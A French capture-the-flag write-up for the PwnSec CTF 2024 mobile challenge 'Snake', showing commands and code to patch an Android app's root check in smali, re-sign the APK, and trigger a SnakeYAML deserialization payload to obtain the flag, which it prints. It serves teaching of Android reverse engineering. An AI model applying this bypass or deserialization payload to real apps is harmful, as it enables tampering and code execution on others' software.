# LAB-19-Snake-R-solution-d-taill-e-tape-par-tape-PwnSec-CTF-2024-Mobile-Hard-

# 🐍 LAB 19 — Snake
### PwnSec CTF 2024 · Catégorie : Mobile · Difficulté : Hard

---

## 📋 Présentation du challenge

Le challenge fournit un fichier `snake.apk` — une application Android embarquant un mécanisme de protection anti-root. Cette protection empêche l'exécution sur tout environnement d'analyse (émulateur ou appareil rooté). Une fois ce verrou contourné, il devient possible d'exploiter une faille de **désérialisation SnakeYAML** afin de déclencher l'exécution de code arbitraire et d'obtenir le flag.

> **Clé thématique :** Le challenge joue sur plusieurs références croisées — le nom "Snake", la classe `BigBoss`, la citation du flag `We're not tools of the government, or anyone else` — qui renvoient toutes à *Metal Gear Solid* et à son protagoniste **Solid Snake**. Le double sens sur *SnakeYAML* (bibliothèque Java de parsing YAML) constitue le nœud central du défi.

---

## 🎯 Objectif

Retrouver le flag au format :

```
PWNSEC{...}
```

---

## 🛠️ Prérequis techniques

| Outil | Utilisation |
|---|---|
| `adb` | Interface avec l'émulateur ou l'appareil Android |
| `jadx` | Décompilateur Java pour la lecture du code reconstitué |
| `apktool` | Décompilation et recompilation du bytecode smali |
| `apksigner` | Re-signature du nouvel APK |
| `Java JDK` (>= 21) | Dépendance nécessaire à apksigner |
| Éditeur de texte | Modification manuelle des fichiers `.smali` |
| PowerShell | Génération du payload YAML |

---

## 🔍 Étape 1 — Déploiement initial et première observation

L'APK est installé sur un émulateur rooté (ou un appareil rooté) via ADB :

```powershell
adb install snake.apk
```
<img width="768" height="138" alt="image" src="https://github.com/user-attachments/assets/7a8710bc-2c11-4a40-a3de-46c13f644daa" />

```
Performing Streamed Install
Success
```

✅ L'installation se déroule sans erreur. En revanche, l'application se ferme immédiatement lors de son lancement sur un environnement rooté.

---

## 🔎 Étape 2 — Lecture du code décompilé avec JADX

La décompilation via **jadx** permet d'examiner le code Java reconstitué.

### Méthode `onCreate()` — Point d'entrée de l'activité principale
<img width="699" height="169" alt="image" src="https://github.com/user-attachments/assets/738f5012-877c-45ed-bdef-e8de9223efc7" />

```java
@Override
public final void onCreate(Bundle bundle) {
    super.onCreate(bundle);
    setContentView(R.layout.activity_main);
    if (isDeviceRooted(getApplicationContext())) {
        Log.w("Rooted", "Root detected! Exiting application.");
        finish();
        System.exit(0);
    }
    // ...
}
```

**Observation :** Au démarrage, l'application invoque `isDeviceRooted()`. Si le device est rooté, elle appelle `finish()` suivi de `System.exit(0)`. C'est la première protection à neutraliser.

### Gestion des permissions de stockage

```java
int i2 = Build.VERSION.SDK_INT;
if (((i2 >= 33) || !TextUtils.equals("android.permission.POST_NOTIFICATIONS",
    "android.permission.READ_EXTERNAL_STORAGE"))
    ? checkPermission("android.permission.READ_EXTERNAL_STORAGE") : C();
    return;

String[] strArr = {"android.permission.READ_EXTERNAL_STORAGE"};
```

L'app réclame un accès au stockage externe — ce qui suggère qu'elle consomme des données depuis un fichier externe, potentiellement un fichier YAML.

---
<img width="1360" height="258" alt="image" src="https://github.com/user-attachments/assets/731807d3-6b43-483a-a934-d6bc8b141f16" />


## ⚙️ Étape 3 — Extraction du bytecode smali avec Apktool

Pour modifier le binaire, on extrait le **code smali** (bytecode Dalvik sous forme lisible) :

```powershell
apktool d snake.apk -o snake_smali
```
<img width="1162" height="436" alt="image" src="https://github.com/user-attachments/assets/c4628d4d-4201-4de4-8ab0-6208439d9d58" />


```
I: Using Apktool 3.0.2 on snake.apk with 4 threads
I: Loading resource table...
I: Baksmaling classes.dex...
I: Decoding value resources...
I: Loading resource table from file: C:\...\apktool\framework\1.apk
I: Decoding file resources...
I: Generating values XMLs...
I: Decoding AndroidManifest.xml with resources...
I: Copying original files...
I: Copying assets...
I: Copying lib...
I: Copying unknown files...
```

Navigation vers le répertoire d'intérêt :

```powershell
cd snake_smali/smali/com/pwnsec/snake/
```

---

## 🔧 Étape 4 — Patch smali : neutralisation du root check

On ouvre `MainActivity.smali` et on repère la méthode `isDeviceRooted` :

### Code original (détection active)
```smali
.method public static isDeviceRooted(Landroid/content/Context;)Z
    .locals 1

    # ... vérifications su, build tags, chemins système, etc.

    const/4 v0, 0x1    ← retourne true si rooté
    return v0
.end method
```

### Code patché ✅
```smali
.method public static isDeviceRooted(Landroid/content/Context;)Z
    .locals 1

    const/4 p0, 0x0    ← force le retour à false (jamais rooté)

    return p0
.end method
```
<img width="907" height="699" alt="image" src="https://github.com/user-attachments/assets/5c1fef58-c9f1-4bab-9afb-01e473256c42" />

**Principe :** Le corps entier de la méthode est remplacé par `const/4 p0, 0x0` (équivalent à `false`) puis `return p0`. Quelle que soit la configuration de l'appareil, l'application considérera désormais qu'il n'est jamais rooté.

---

## 📦 Étape 5 — Recompilation de l'APK modifié

```powershell
apktool b snake_smali -o snake_patched.apk
```

```
I: Using Apktool 3.0.2 on snake.apk with 4 threads
I: Smaling smali folder into classes.dex...
I: Building resources with aapt2...
I: Building apk file...
I: Importing assets...
I: Importing lib...
I: Importing unknown files...
I: Built apk into: snake_patched.apk
```

✅ Le fichier `snake_patched.apk` est généré avec succès.
<img width="1105" height="295" alt="image" src="https://github.com/user-attachments/assets/7a068b6b-2ec3-4358-9853-49400ff0f0d2" />

---

## ✍️ Étape 6 — Signature de l'APK patché

Un APK non signé est refusé à l'installation. On utilise le **debug keystore** standard via `apksigner`.

```powershell
# Définir JAVA_HOME
$env:JAVA_HOME = "C:\Program Files\Microsoft\jdk-21.0.8.9-hotspot"

# Signer l'APK
& "C:\...\Android\Sdk\build-tools\36.1.0\apksigner.bat" sign `
    --ks debug.keystore `
    --ks-pass pass:android `
    --key-pass pass:android `
    --out snake_signed.apk `
    snake_patched.apk
```

Vérification du fichier produit :

```powershell
ls snake_signed.apk
```

```
Mode       LastWriteTime   Length  Name
----       -------------   ------  ----
-a----     06/06/2026      14:58   5920949  snake_signed.apk
```
<img width="1600" height="438" alt="image" src="https://github.com/user-attachments/assets/c29e9b8d-c920-4bd6-a82c-49d74a0ee5ec" />


### Contrôle de la signature

```powershell
& "C:\...\apksigner.bat" verify snake_signed.apk
echo $?
```

```
True
```
<img width="1600" height="159" alt="image" src="https://github.com/user-attachments/assets/47fcb481-0a47-4ffa-be69-bebfd0839a92" />

✅ La signature est conforme.

---

## 📲 Étape 7 — Installation de la version patchée

```powershell
adb install snake_signed.apk
```

```
Performing Streamed Install
Success
```

L'application démarre désormais normalement, même sur un émulateur rooté. Le bypass anti-root est effectif.
<img width="894" height="124" alt="image" src="https://github.com/user-attachments/assets/de0fb779-507f-43f5-a5dd-6ac6454e82dc" />

---

## 💣 Étape 8 — Exploitation via désérialisation SnakeYAML

L'analyse du code met en évidence l'utilisation de **SnakeYAML** pour parser un fichier YAML lu depuis le stockage externe. Cette bibliothèque est exposée à une **désérialisation non contrôlée** via la syntaxe `!!` (type tag explicite), qui force l'instanciation d'une classe Java arbitraire.

### Classe cible identifiée
```
com.pwnsec.snake.BigBoss
```

### Construction du payload YAML

Depuis PowerShell, on crée le fichier `Skull_Face.yml` :

```powershell
$payload = '!!com.pwnsec.snake.BigBoss ["Snaaaaaaaaaaaaake"]'

[System.IO.File]::WriteAllText(
    "$env:USERPROFILE\Desktop\snake\snake\Skull_Face.yml",
    $payload,
    (New-Object System.Text.UTF8Encoding $false)   # UTF-8 sans BOM
)
```

Vérification du contenu généré :

```powershell
Get-Content "$env:USERPROFILE\Desktop\snake\snake\Skull_Face.yml"
```

```
!!com.pwnsec.snake.BigBoss ["Snaaaaaaaaaaaaake"]
```
<img width="1387" height="304" alt="image" src="https://github.com/user-attachments/assets/94ef4e25-5f83-4071-9ce7-be69937d23e7" />

### Fonctionnement du payload

| Élément | Rôle |
|---|---|
| `!!com.pwnsec.snake.BigBoss` | Ordonne à SnakeYAML d'instancier cette classe Java par réflexion |
| `["Snaaaaaaaaaaaaake"]` | Argument transmis au constructeur de la classe |
| Résultat | L'instanciation de `BigBoss` déclenche son constructeur, lequel retourne ou affiche le flag |

> **Mécanisme sous-jacent :** Lorsque SnakeYAML rencontre un tag `!!`, il tente d'instancier la classe Java indiquée par réflexion. Si `BigBoss` est présente dans le classpath de l'application et que son constructeur produit un effet de bord observable (affichage du flag), l'attaquant peut provoquer cette exécution sans accès direct au code source complet.

### Transfert du payload sur l'appareil

```powershell
adb push Skull_Face.yml /sdcard/Skull_Face.yml
```

Le fichier est ensuite consommé par l'application au démarrage ou via son interface.

---

## 🏁 Étape 9 — Récupération du flag

L'exécution du payload produit le flag suivant :

```
PWNSEC{W3'r3_N0t_T00l5_0f_The_g0v3rnm3n7_0R_4ny0n3_3ls3}
```
<img width="339" height="14" alt="image" src="https://github.com/user-attachments/assets/38db3795-c23b-4443-82b5-18b6e5ff6e04" />

---

## 🧠 Récapitulatif de la chaîne d'exploitation

```
[1] Installation de l'APK original
         ↓
[2] Analyse statique (JADX) → identification du root check
         ↓
[3] Extraction du bytecode smali (apktool)
         ↓
[4] Patch de isDeviceRooted() → retour forcé à false
         ↓
[5] Recompilation + re-signature de l'APK modifié
         ↓
[6] Installation → application pleinement fonctionnelle
         ↓
[7] Identification de la vulnérabilité SnakeYAML
         ↓
[8] Craft du payload → !!com.pwnsec.snake.BigBoss
         ↓
[9] Exécution → FLAG 🎉
```

---

## 📚 Notions techniques couvertes

- **Reverse engineering Android** : extraction du bytecode smali avec apktool, lecture Java reconstituée via jadx
- **Contournement anti-root** : modification directe du bytecode Dalvik (.smali) pour désactiver une détection d'environnement
- **Re-signature d'APK** : reconstruction et signature d'un binaire Android altéré
- **Désérialisation SnakeYAML** : abus du type tag `!!` pour instancier des classes arbitraires au parsing
- **ADB** : déploiement et interaction avec un appareil ou émulateur Android

---

## 🔗 Références

- [SnakeYAML Deserialization - HackTricks](https://book.hacktricks.xyz/pentesting-web/deserialization#snakeyaml)
- [Apktool Documentation](https://apktool.org/)
- [apksigner — Android Developer Docs](https://developer.android.com/tools/apksigner)
- [Smali/Baksmali Reference](https://github.com/JesusFreke/smali)
